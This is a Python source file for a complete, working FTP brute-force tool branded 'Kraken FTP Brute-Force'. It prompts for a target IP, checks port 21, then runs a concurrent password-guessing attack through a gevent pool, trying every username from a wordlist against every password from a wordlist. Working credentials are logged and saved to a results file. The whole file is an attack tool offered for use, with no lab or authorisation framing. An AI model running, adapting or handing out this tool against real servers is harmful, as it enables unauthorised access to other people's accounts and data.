import os
import sys
import time
import socket
import logging
from ftplib import FTP
from random import choice
import gevent
from gevent import monkey
from gevent.pool import Pool


monkey.patch_all()


try:
    from colorama import Fore, Style, init
    import pyfiglet
except ImportError as e:
    missing_module = str(e).split("named ")[-1]
    print(f"The required module '{missing_module}' is not installed.")
    print("Please install all dependencies using 'pip install -r requirements.txt'.")
    sys.exit(1)


init(autoreset=True)


script_dir = os.path.dirname(os.path.abspath(__file__))
results_dir = os.path.join(script_dir, '..', 'Results')
logs_dir = os.path.join(script_dir, '..', 'Logs')


os.makedirs(results_dir, exist_ok=True)
os.makedirs(logs_dir, exist_ok=True)


logging.basicConfig(filename=os.path.join(logs_dir, 'ftp_brute_force.log'), level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the banner for the script."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    banner = pyfiglet.figlet_format("Kraken FTP Brute-Force", font="slant")
    print(Style.BRIGHT + banner_color + banner)
    print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")

def load_file(file_path):
    """Loads usernames or passwords from a specified file."""
    if os.path.isfile(file_path):
        with open(file_path, "r", encoding="utf-8") as file:
            return [line.strip() for line in file if line.strip()]
    else:
        logging.error(f"File not found: {file_path}")
        sys.exit(1)

def check_ftp_port(target):
    """Checks if the FTP port (21) is open on the target."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            return sock.connect_ex((target, 21)) == 0
    except socket.gaierror as e:
        logging.error(f"Network error: {e}")
        return False

def login_attempt(ip, username, password, attempt_number, total_attempts, start_time, result_file):
    """Attempts to log in to the FTP server using provided credentials."""
    def format_output(success):
        elapsed_time = time.time() - start_time
        percentage = (attempt_number / total_attempts) * 100
        estimated_total_time = elapsed_time / (attempt_number / total_attempts)
        remaining_time = estimated_total_time - elapsed_time
        time_remaining_str = time.strftime('%H:%M:%S', time.gmtime(remaining_time))
        status = "Success" if success else ""
        return f"\r[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Estimated Remaining Time: {time_remaining_str} | Current: {username}:{password} {status}"

    try:
        with FTP() as ftp:
            ftp.connect(ip, timeout=10)
            ftp.login(user=username, passwd=password)
            sys.stdout.write('\033[K')  
            success_msg = format_output(True)
            print(Style.BRIGHT + Fore.GREEN + success_msg + Style.RESET_ALL)
            logging.info(success_msg.strip())
            result_file.write(success_msg.strip() + "\n")
            result_file.flush()  
            return success_msg
    except Exception as e:
        sys.stdout.write('\033[K')  
        fail_msg = format_output(False)
        print(Fore.WHITE + fail_msg, end='', flush=True)
        logging.debug(f"Login failed for {username}:{password} @ {ip}: {e}")
        return None


def run_brute_force(ip, usernames, passwords, threads):
    """Executes brute force login attempts using gevent pool."""
    total_attempts = len(usernames) * len(passwords)
    start_time = time.time()
    attempt_number = 0
    results = []
    pool = Pool(threads)

    result_file_path = os.path.join(results_dir, "ftp_results.txt")
    with open(result_file_path, "a") as result_file:  

        def handle_result(username, password):
            nonlocal attempt_number
            attempt_number += 1
            result = login_attempt(ip, username, password, attempt_number, total_attempts, start_time, result_file)
            if result:
                results.append(result)

        for username in usernames:
            for password in passwords:
                pool.spawn(handle_result, username, password)

        pool.join()

    logging.info("Brute force process completed.")

def get_user_input():
    """Gets user input for the brute-force operation."""
    print(Style.BRIGHT + Fore.YELLOW + "Input Configuration" + Style.RESET_ALL)
    target_ip = input(Fore.WHITE + "Enter the FTP server IP address: ").strip()

    if check_ftp_port(target_ip):
        use_list = input(Fore.WHITE + "Use a username list? (Y/n): ").strip().upper() != 'N'
        if use_list:
            user_file = input(Fore.WHITE + "Enter path to username list (default: users.txt): ").strip() or os.path.join(script_dir, "..", "wordlists", "users.txt")
            users = load_file(user_file)
        else:
            users = [input(Fore.WHITE + 'Enter single username: ').strip()]

        pwd_file = input(Fore.WHITE + "Enter path to password list (default: passwords.txt): ").strip() or os.path.join(script_dir, "..", "wordlists", "passwords.txt")
        pwds = load_file(pwd_file)

        threads = int(input(Fore.WHITE + "Enter number of threads to use (default: 40, press Enter for default): ") or 40)

        return target_ip, users, pwds, threads
    else:
        logging.error(Fore.RED + 'FTP port 21 is not open. Check the target IP or server status.')
        sys.exit(1)

def main():
    clear_console()
    display_banner()
    target_ip, users, pwds, threads = get_user_input()
    print(Style.RESET_ALL + Fore.WHITE + "\n" + "="*80 + "\n")
    run_brute_force(target_ip, users, pwds, threads)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info(Fore.YELLOW + "\nScript interrupted by user.")
